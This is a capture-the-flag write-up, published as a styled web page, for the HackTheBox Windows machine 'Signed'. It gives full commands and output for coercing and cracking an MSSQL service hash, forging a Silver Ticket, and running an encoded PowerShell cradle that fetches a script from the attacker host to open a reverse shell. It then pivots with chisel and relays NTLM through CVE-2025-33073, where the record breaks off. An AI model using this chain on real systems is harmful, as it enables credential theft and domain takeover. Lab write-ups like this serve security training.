@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyber Era Labs | Signed</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;family=Space+Grotesk:wght@500;600&amp;display=swap');
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: linear-gradient(135deg, #1a1333, #2a1f5f, #1a1333);
+            background-size: 400% 400%;
+            animation: kawaiiGradient 25s ease infinite;
+        }
+        @keyframes kawaiiGradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .logo-font { font-family: 'Space Grotesk', sans-serif; }
+        .neon-pink { text-shadow: 0 0 15px #ec4899, 0 0 30px #ec4899; }
+        .neon-cyan { text-shadow: 0 0 15px #67e8f9, 0 0 30px #67e8f9; }
+
+        .article-frame {
+            background: #27272a;
+            border: 8px solid #ec4899;
+            border-radius: 32px;
+            box-shadow: 
+                0 0 50px -15px #ec4899,
+                inset 0 0 60px -20px #ec4899;
+            padding: 3rem;
+        }
+
+        .prose { 
+            color: #e2e8f0; 
+            max-width: 100%; 
+        }
+        .prose p, .prose li, .prose td { 
+            font-size: 1.15rem; 
+            line-height: 1.85; 
+            color: #cbd5e1; 
+        }
+
+        .prose h1 { 
+            font-size: 3.2rem; 
+            color: #ec4899; 
+            text-shadow: 0 0 25px #ec4899, 0 0 40px #ec4899; 
+            font-family: 'Space Grotesk', sans-serif; 
+            margin-top: 2.5rem; 
+            margin-bottom: 1.25rem; 
+        }
+        .prose h2 { 
+            font-size: 2.6rem; 
+            color: #67e8f9; 
+            text-shadow: 0 0 20px #67e8f9, 0 0 35px #67e8f9; 
+            font-family: 'Space Grotesk', sans-serif; 
+            margin-top: 3rem; 
+            margin-bottom: 1rem; 
+        }
+        .prose h3 { 
+            font-size: 2.1rem; 
+            color: #ec4899; 
+            text-shadow: 0 0 15px #ec4899, 0 0 30px #ec4899; 
+            font-family: 'Space Grotesk', sans-serif; 
+            margin-top: 2.75rem; 
+            margin-bottom: 0.75rem; 
+        }
+        .prose h4, .prose h5, .prose h6 { 
+            font-size: 1.75rem; 
+            color: #67e8f9; 
+            font-family: 'Space Grotesk', sans-serif; 
+            margin-top: 2.5rem; 
+        }
+
+        .prose ul, .prose ol { 
+            list-style: none; 
+            padding-left: 0; 
+        }
+        .prose ul li, .prose ol li { 
+            position: relative; 
+            padding-left: 2rem; 
+            margin-bottom: 0.75rem; 
+        }
+        .prose ul li::before, .prose ol li::before { 
+            content: "♦"; 
+            position: absolute; 
+            left: 0; 
+            color: #ec4899; 
+            font-size: 1.4rem; 
+        }
+
+        .prose table { 
+            width: 100%; 
+            border-collapse: collapse; 
+            margin: 2rem 0; 
+            border-radius: 16px; 
+            overflow: hidden; 
+            background: #18181b; 
+        }
+        .prose th, .prose td { 
+            padding: 1rem 1.25rem; 
+            border-bottom: 2px solid #3b0764; 
+        }
+        .prose th { 
+            background: #4c1d95; 
+            color: #e0f2fe; 
+            font-weight: 700; 
+        }
+        .prose tr:nth-child(even) { 
+            background: #27272a; 
+        }
+
+        .prose pre { 
+            background: #18181b; 
+            padding: 1.75rem; 
+            border-radius: 20px; 
+            overflow-x: auto; 
+            border: 4px solid #67e8f9; 
+            box-shadow: 0 0 25px -10px #67e8f9; 
+            font-size: 0.95rem; 
+            line-height: 1.6; 
+            margin-top: 2.5rem; 
+            margin-bottom: 2.5rem; 
+        }
+        .prose code { 
+            font-family: ui-monospace, monospace; 
+            color: #e0f2fe; 
+        }
+
+        .prose a { 
+            color: #67e8f9; 
+            text-decoration: underline; 
+            text-underline-offset: 4px; 
+        }
+        .prose a:hover { 
+            color: #ec4899; 
+        }
+
+        .prose img { 
+            max-width: 100%; 
+            border-radius: 20px; 
+            margin: 2.5rem 0; 
+            box-shadow: 0 15px 25px -10px #ec4899; 
+        }
+
+        .prose blockquote { 
+            border-left: 6px solid #ec4899; 
+            padding-left: 1.5rem; 
+            color: #cbd5e1; 
+            background: #27272a; 
+            border-radius: 0 12px 12px 0; 
+            padding: 1.25rem; 
+        }
+    </style>
+</head>
+<body class="text-zinc-100">
+    <nav class="fixed top-0 left-0 right-0 bg-zinc-900/90 backdrop-blur-xl border-b border-zinc-800 z-50">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
+            <a href="../index.html" class="flex items-center gap-3">
+                <div>
+                    <span class="logo-font text-3xl font-bold tracking-tighter neon-pink">CYBER ERA</span>
+                    <span class="logo-font text-3xl font-bold tracking-tighter neon-white">LABS</span>
+                </div>
+            </a>
+
+            <div class="hidden md:flex items-center gap-8 text-sm font-medium">
+                <a href="../index.html" class="text-pink-400 transition-colors">HOME</a>
+                <a href="./" class="hover:text-pink-400 transition-colors">HACKTHEBOX</a>
+                <a href="../blueteam/" class="hover:text-pink-400 transition-colors">BLUE TEAM &amp; SHERLOCKS</a>
+                <a href="../threatintel/" class="hover:text-pink-400 transition-colors">THREAT INTEL</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="max-w-7xl mx-auto px-6 pt-28 pb-12">   
+        <a href="./" class="text-pink-400 hover:text-pink-500 mb-8 inline-flex items-center gap-2 text-sm font-medium">
+            ← Back to HackTheBox Library
+        </a>
+        
+        <div class="flex items-center gap-4 text-xs text-zinc-400 mb-6">
+            <span class="px-4 py-1 bg-pink-900 text-pink-300 rounded-3xl font-mono tracking-widest">HACKTHEBOX</span>
+        </div>
+
+        <div class="article-frame">
+            <h1 class="text-5xl font-bold logo-font tracking-tighter neon-pink mb-6">Signed</h1>
+            
+            <div class="prose">
+                <div class="w-96 h-auto mx-auto">  
+                    <img 
+                        src="images/signed.jpg" 
+                        class="w-full h-auto object-cover rounded-xl shadow-2xl"
+                        alt="HackTheBox Signed "
+                   >
+                </div>
+<h2>Summary</h2>
+<p>Signed is a Windows HackTheBox machine and as is common in real life Windows penetration tests, we will start the Signed box with credentials for the following account which can be used to access the MSSQL service: </p>
+<pre><code>scott / Sm230#C5NatH
+</code></pre>
+<h2>Initial Enumeration</h2>
+<h3>Nmap Scan</h3>
+<pre><code>└─$ nmap 10.129.242.173  -oA nmap/signed        
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-24 07:03 UTC
+Nmap scan report for 10.129.242.173
+Host is up (0.034s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+
+Nmap done: 1 IP address (1 host up) scanned in 38.29 seconds
+</code></pre>
+<p>From the Nmap output we have only one port open, the 1433 relative to MSSQL.</p>
+<h3>Access enumeration</h3>
+<p>With the credentials provided we will test them for mssql using netexec. <br />
+When testing for mssql access we have to try even with local-auth flag, because without this flag, the login will come from an untrusted domain and the connection will fail.</p>
+<pre><code>└─$ nxc mssql 10.129.242.173 -u scott  -p 'Sm230#C5NatH' 
+MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
+MSSQL       10.129.242.173  1433   DC01             [-] SIGNED.HTB\scott:Sm230#C5NatH (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.')
+</code></pre>
+<pre><code>└─$ nxc mssql 10.129.242.173 -u scott  -p 'Sm230#C5NatH' --local-auth
+MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
+MSSQL       10.129.242.173  1433   DC01             [+] DC01\scott:Sm230#C5NatH 
+</code></pre>
+<h2>MSSQL ENUMERATION as User SCOTT</h2>
+<p>We will access the MSSQL service with impacket and enumerate our user and our permissions, and the user that we can impersonate.</p>
+<pre><code>└─$ impacket-mssqlclient scott@10.129.242.173                             
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01): Line 1: Changed database context to 'master'.
+[*] INFO(DC01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
+[!] Press help for extra shell commands
+SQL (scott  guest@master)&gt; 
+</code></pre>
+<h3>Verifying our Current User and Role</h3>
+<pre><code>SQL (scott  guest@master)&gt; SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin');
+</code></pre>
+                <div class="w-96 h-auto mx-auto">  
+                    <img 
+                        src="images/mssql1.jpg" 
+                        class="w-full h-auto object-cover rounded-xl shadow-2xl"
+                        alt="HackTheBox Signed "
+                   >
+                </div>
+<p>From the output above we see that the flag is set to 0, so the user scott isn't an Admin.</p>
+<h3>Identify Users that We Can Impersonate</h3>
+<pre><code>SQL (scott  guest@master)&gt; SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+name   
+----   
+SQL (scott  guest@master)&gt; 
+</code></pre>
+<p>The user scott doesn't has the IMPERSONATE permission on any user.</p>
+<p>So far we don't have any permission.  </p>
+<h3>Stealing the Hash of the MSSQL Service Account</h3>
+<p>We can try steal the MSSQL service account hash using <code>xp_subdirs</code> or <code>xp_dirtree</code> undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server. We need first top start Responder.</p>
+<pre><code>└─$ sudo responder -I tun0  
+</code></pre>
+<p>The we execute xp_dirtree on the MSSQL service.</p>
+<pre><code>SQL (scott  guest@master)&gt; EXEC master..xp_dirtree '\\10.10.15.204\share\'
+</code></pre>
+<p>And we got the hash of the mssqlsvc service account.</p>
+                <div class="w-96 h-auto mx-auto">  
+                    <img 
+                        src="images/responder1.jpg" 
+                        class="w-full h-auto object-cover rounded-xl shadow-2xl"
+                        alt="HackTheBox Signed "
+                   >
+                </div>
+<p>We save this hash and we use hashcat to crack it.</p>
+<pre><code>└─$ hashcat -m 5600 mssqlsvc_hash /usr/share/wordlists/rockyou.txt  
+hashcat (v7.1.2) starting
+
+&lt;SNIP&gt;
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+MSSQLSVC::SIGNED:3269435dd2b173fc:ad487919e1aefd747de9d4653e5c210e:010100000000000080138e6b60bbdc01dc6de74412800b9b0000000002000800360039004b00510001001e00570049004e002d004d004f0054003500570043005a0049005a004100550004003400570049004e002d004d004f0054003500570043005a0049005a00410055002e00360039004b0051002e004c004f00430041004c0003001400360039004b0051002e004c004f00430041004c0005001400360039004b0051002e004c004f00430041004c000700080080138e6b60bbdc0106000400020000000800300030000000000000000000000000300000ff24d729473b2b9d99b3619a09ce58a5345c33ce5befbcab3cb8707db846fb8a0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003200300034000000000000000000:purPLE9795!@
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: MSSQLSVC::SIGNED:3269435dd2b173fc:ad487919e1aefd747...000000
+&lt;SNIP&gt;
+</code></pre>
+<h2>MSSQL ENUMERATION as User MSSQLSVC</h2>
+<pre><code>└─$ impacket-mssqlclient mssqlsvc@10.129.242.173             
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Encryption required, switching to TLS
+[-] ERROR(DC01): Line 1: Login failed for user 'mssqlsvc'.
+</code></pre>
+<p>The login failed, we have to try with -windows-auth flag.</p>
+<pre><code>└─$ impacket-mssqlclient mssqlsvc@10.129.242.173 -windows-auth
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01): Line 1: Changed database context to 'master'.
+[*] INFO(DC01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
+[!] Press help for extra shell commands
+SQL (SIGNED\mssqlsvc  guest@master)&gt; 
+</code></pre>
+<h3>Identify Users that We Can Impersonate</h3>
+<pre><code>SQL (SIGNED\mssqlsvc  guest@master)&gt; SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
+name   
+---- 
+</code></pre>
+<h3>Verifying our Current User and Role</h3>
+<pre><code>SQL (SIGNED\mssqlsvc  guest@master)&gt; SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin');
+
+-----------   
+SIGNED\mssqlsvc   
+          0 
+</code></pre>
+<p>Trying to enable xp_cmdshell</p>
+<pre><code>SQL (SIGNED\mssqlsvc  guest@master)&gt; enable_xp_cmdshell 
+ERROR(DC01): Line 105: User does not have permission to perform this action.
+ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
+ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
+ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
+</code></pre>
+<p>Using the help command to see what other commands we can execute.</p>
+<pre><code>SQL (SIGNED\mssqlsvc  guest@master)&gt; help
+
+    lcd {path}                 - changes the current local directory to {path}
+    exit                       - terminates the server process (and this session)
+    enable_xp_cmdshell         - you know what it means
+    disable_xp_cmdshell        - you know what it means
+    enum_db                    - enum databases
+    enum_links                 - enum linked servers
+    enum_impersonate           - check logins that can be impersonated
+    enum_logins                - enum login users
+    enum_users                 - enum current db users
+    enum_owner                 - enum db owner
+    exec_as_user {user}        - impersonate with execute as user
+    exec_as_login {login}      - impersonate with execute as login
+    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+    xp_dirtree {path}          - executes xp_dirtree on the path
+    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
+    ! {cmd}                    - executes a local shell cmd
+    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
+    download {from} {to}       - downloads file from the SQLServer host {from} to {to}
+    show_query                 - show query
+    mask_query                 - mask query
+</code></pre>
+<p>So we have tried to enumerate the user permission, linked servers. We can try to enumerate the users present on the machine and logins.</p>
+<h3>Enumerating Users</h3>
+<pre><code>SQL (SIGNED\mssqlsvc  guest@master)&gt; enum_users
+UserName                            RoleName   LoginName                           DefDBName   DefSchemaName       UserID                                                                   SID                   
+---------------------------------   --------   ---------------------------------   ---------   -------------   ----------   -------------------------------------------------------------------                   
+##MS_AgentSigningCertificate##      public     ##MS_AgentSigningCertificate##      master      NULL            b'6         '   b'010600000000000901000000fb1b6ce60eda55e1d3dde93b99db322bfc435563'                                          
+##MS_PolicyEventProcessingLogin##   public     ##MS_PolicyEventProcessingLogin##   master      dbo             b'5         '                                   b'56f12609fb4eb548906b5a62effb1840'                                          
+dbo                                 db_owner   sa                                  master      dbo             b'1         '                                                                 b'01'                                          
+guest                               public     NULL                                NULL        guest           b'2         '                                                                 b'00'                                          
+INFORMATION_SCHEMA                  public     NULL                                NULL        NULL            b'3         '                                                                  NULL                                          
+sys                                 public     NULL                                NULL        NULL            b'4         '                                                                  NULL 
+</code></pre>
+<h3>Enumerating Logins</h3>
+<pre><code>SQL (SIGNED\mssqlsvc  guest@master)&gt; enum_logins
+name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
+---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
+sa                                  SQL_LOGIN                 0          1               0             0            0              0           0           0           0   
+##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0   
+##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0   
+SIGNED\IT                           WINDOWS_GROUP             0          1               0             0            0              0           0           0           0   
+NT SERVICE\SQLWriter                WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+NT SERVICE\Winmgmt                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+NT SERVICE\MSSQLSERVER              WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+NT AUTHORITY\SYSTEM                 WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
+NT SERVICE\SQLSERVERAGENT           WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+NT SERVICE\SQLTELEMETRY             WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
+scott                               SQL_LOGIN                 0          0               0             0            0              0           0           0           0   
+SIGNED\Domain Users                 WINDOWS_GROUP             0          0               0             0            0              0           0           0           0  
+</code></pre>
+<p>What we see here is that we have  sa and other five users who have the sysadmin privileges, and one group, SIGNED\IT.</p>
+<h2>Initial access</h2>
+<h3>Silver Ticket</h3>
+<p>A Silver Ticket allows an attacker to forge a valid Kerberos service ticket (TGS) for a specific service without communicating with the Domain Controller. It works because the service ticket is encrypted using the NTLM hash of the service account that owns the SPN.</p>
+<h4>Normal Kerberos Authentication Flow:</h4>
+<ol>
+<li>The client requests a service ticket from the Domain Controller (KDC) for MSSQLSvc/DC01.signed.htb:1433.</li>
+<li>The DC validates the request and encrypts the ticket with the NTLM hash of the service account (mssqlsvc).</li>
+<li>The client presents the ticket to the MSSQL service, which decrypts it using its own hash and trusts the user and group information inside the PAC.</li>
+</ol>
+<h4>With a Silver Ticket:</h4>
+<p>We can completely skip steps 1 and 2. Since we already possessed the NTLM hash of the mssqlsvc service account (the account that registered the MSSQL SPN), we forged a service ticket locally using that hash.</p>
+<p>We created a ticket that:</p>
+<ul>
+<li>Impersonated any username I wanted</li>
+<li>Included the SID of the SIGNED\IT group in the PAC</li>
+</ul>
+<p>Because the MSSQL service trusts any ticket encrypted with its own service account hash, it accepted the forged ticket as valid. The service saw that the presented user belonged to the SIGNED\IT group, which is mapped to the <strong>sysadmin</strong> server role, granting us full administrative privileges on the database.</p>
+<h4>Why Silver Ticket was effective here:</h4>
+<ul>
+<li>We had already obtained the mssqlsvc account’s NTLM hash earlier.</li>
+<li>Enumeration showed that the Windows group SIGNED\IT had sysadmin rights on the SQL server.</li>
+<li>This attack is more stealthy and requires fewer privileges than a Golden Ticket (which needs the KRBTGT hash), as it only targets one specific service.</li>
+</ul>
+<p>We then used the forged Silver Ticket to authenticate to the MSSQL instance and escalated privileges.</p>
+<p>Because the SQL service trusts Kerberos tickets that are encrypted with mssqlsvc’s own hash, we can:</p>
+<ol>
+<li>Forge a silver ticket as any user or a fake user.</li>
+<li>Add the RID of the IT group.</li>
+<li>The SQL service will see “this user is in SIGNED\IT”.</li>
+</ol>
+<p>Getting the RID of the user mssqlsvc (and is NTLM hash) and for the group SIGNED\IT, and the domain SID.</p>
+<ul>
+<li>Getting the NTLM HASH of the user mssqlsvc.</li>
+</ul>
+<pre><code>└─$ python3 -c 'import hashlib; print(hashlib.new(&quot;md4&quot;, &quot;purPLE9795!@&quot;.encode(&quot;utf-16le&quot;)).hexdigest())'
+ef699384c3285c54128a3ee1ddb1a0cc
+</code></pre>
+<ul>
+<li>Getting the domain SID.</li>
+</ul>
+<pre><code>SQL (SIGNED\mssqlsvc  guest@master)&gt; SELECT SUSER_SID('SIGNED\Domain Users');
+
+-----------------------------------------------------------   
+b'0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000' 
+</code></pre>
+<pre><code>└─$ python                                                                                               
+Python 3.13.9 (main, Oct 15 2025, 14:56:22) [GCC 15.2.0] on linux
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&gt;&gt;&gt; from impacket.dcerpc.v5.dtypes import SID
+&gt;&gt;&gt; SID(bytes.fromhex('0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000')).formatCanonical()
+'S-1-5-21-4088429403-1159899800-2753317549-513'
+&gt;&gt;&gt; 
+</code></pre>
+<ul>
+<li>Getting the RID of the group SIGNED/IT.</li>
+</ul>
+<pre><code>SQL (SIGNED\mssqlsvc  guest@master)&gt; select SUSER_SID('Signed\IT')
+
+-----------------------------------------------------------   
+b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000' 
+</code></pre>
+<pre><code>└─$ python
+Python 3.13.9 (main, Oct 15 2025, 14:56:22) [GCC 15.2.0] on linux
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&gt;&gt;&gt; from impacket.dcerpc.v5.dtypes import SID
+&gt;&gt;&gt; SID(bytes.fromhex('0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000')).formatCanonical()
+'S-1-5-21-4088429403-1159899800-2753317549-1105'
+&gt;&gt;&gt; 
+</code></pre>
+<p>So the RID is 1105.</p>
+<ul>
+<li>Forging the Silver Ticket.</li>
+</ul>
+<pre><code>┌──(kali㉿kali)-[~/LABS/Signed]
+└─$ impacket-ticketer -spn MSSQLSvc/DC01.signed.htb:1433 \
+                  -nthash ef699384c3285c54128a3ee1ddb1a0cc \
+                  -domain signed.htb \
+                  -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
+                  -user Administrator \
+                  -groups '512,1105' Administrator
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for signed.htb/Administrator
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+
+┌──(kali㉿kali)-[~/LABS/Signed]
+└─$ export KRB5CCNAME=Administrator.ccache 
+</code></pre>
+<ul>
+<li>Login in and grabbing user.txt</li>
+</ul>
+<pre><code>└─$ KRB5CCNAME=Administrator.ccache impacket-mssqlclient -no-pass -k DC01.signed.htb
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01): Line 1: Changed database context to 'master'.
+[*] INFO(DC01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
+[!] Press help for extra shell commands
+SQL (SIGNED\Administrator  dbo@master)&gt; enable_xp_cmdshell
+INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (SIGNED\Administrator  dbo@master)&gt; xp_cmdshell whoami
+output            
+---------------   
+signed\mssqlsvc   
+NULL              
+SQL (SIGNED\Administrator  dbo@master)&gt; xp_cmdshell &quot;type C:\Users\mssqlsvc\Desktop\user.txt&quot;
+output                             
+--------------------------------   
+ede05ac9e516************  
+NULL                               
+
+SQL (SIGNED\Administrator  dbo@master)&gt; xp_cmdshell &quot;type C:\Users\Administrator\Desktop\root.txt&quot;
+output              
+-----------------   
+Access is denied.   
+NULL  
+</code></pre>
+<ul>
+<li>We get a reverse shell to enumerate further.</li>
+</ul>
+<pre><code>SQL (SIGNED\mssqlsvc  dbo@master)&gt; xp_cmdshell powershell -encodedcommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANQAuADIAMAA0ADoAOAAwADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=
+</code></pre>
+<pre><code>└─$ rlwrap nc -nvlp 443
+listening on [any] 443 ...
+connect to [10.10.15.204] from (UNKNOWN) [10.129.242.173] 55245
+
+PS C:\Windows\system32&gt; 
+</code></pre>
+<h2>PRIVILEGE ESCALATION</h2>
+<h3>Using NTLM Relay Attack</h3>
+<p>The NTLM reflection technique behind <strong>CVE-2025-33073</strong> exploits how Windows decides whether an SMB connection is “local” or “remote.”</p>
+<p>An attacker creates a <strong>malicious DNS record</strong> with a specially crafted name (a so-called <em>ghost SPN</em>) that looks like it belongs to the victim machine, but actually points to the attacker’s system. When the victim connects to that name, Windows is fooled into thinking it’s talking to itself.</p>
+<p>Because of this misclassification, the SMB client treats the connection as <strong>local</strong>, allowing authentication to proceed with <strong>high privileges (SYSTEM level)</strong>. This bypasses normal protections against NTLM reflection and lets the attacker <strong>relay the authentication and escalate privileges</strong>.<br />
+More on <a href="https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx">Relaying Kerberos over SMB using krbrelayx</a></p>
+<h4>Setting up proxychains and chisel.</h4>
+<pre><code>└─$ cat /etc/proxychains4.conf
+&lt;snip&gt;
+#socks4         127.0.0.1 9050 #tor
+socks5  127.0.0.1 1080 #ssh pivoting
+#http  127.0.0.1 8080 #burp
+</code></pre>
+<pre><code>└─$ chisel server --reverse -p 8000 
+2026/03/24 10:03:52 server: Reverse tunnelling enabled
+2026/03/24 10:03:52 server: Fingerprint DlKg09A8J1BbQsP+pz38fWeV4lS/Kl+IF/9ZnlkqGuQ=
+2026/03/24 10:03:52 server: Listening on http://0.0.0.0:8000
+
+</code></pre>
+<p>Uploading chisel to the target machine and starting the reverse proxy</p>
+<pre><code>PS C:\tools&gt; iwr -uri http://10.10.15.204:8000/chisel.exe -outfile chisel.exe
+PS C:\tools&gt; .\chisel.exe client 10.10.15.204:8000 R:socks
+
+</code></pre>
+<h4>Steps to reproduce the attack</h4>
+<ol>
+<li>Verify SMB connectivity through proxychains.</li>
+</ol>
+<pre><code>└─$ proxychains nc -zv 10.129.242.173 445                                                     
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.242.173:445  ...  OK
+10.129.242.173 [10.129.242.173] 445 (microsoft-ds) open : Operation now in progress
+</code></pre>
+<ol>
+<li>Add the required DNS record.( <a href="https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py">dnstool</a>)</li>
+</ol>
+<pre><code>└─$ git clone https://github.com/dirkjanm/krbrelayx
+
+└─$ proxychains python dnstool.py -u 'SIGNED\mssqlsvc' -p 'purPLE9795!@' -a add -r dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA -d 10.10.15.204 10.129.242.173
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[-] Connecting to host...
+[-] Binding to host
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.242.173:389  ...  OK
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+
+</code></pre>
+<ol>
+<li>Using nrlmrelayx to catch the authentication. We run impacket-ntlmrelayx from Impacket to catch the authentication and relay it into a WinRM-based shell with the following options:<ul>
+<li>-t winrms://DC01.signed.htb - The target of this attack is WinRM on HTTPS on DC01.</li>
+</ul>
+</li>
+</ol>
+<pre><code>└─$ proxychains impacket-ntlmrelayx -t winrms://DC01.signed.htb -smb2support                                                                                      
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client WINRMS loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Setting up WinRM (HTTP) Server on port 5985
+[*] Setting up WinRMS (HTTPS) Server on port 5986
+[*] Setting up RPC Server on port 135
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections
+[*] (SMB): Received connection from 10.129.242.173, attacking target winrms://DC01.signed.htb
+[!] The client requested signing, relaying to WinRMS might not work!
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:5986  ...  OK
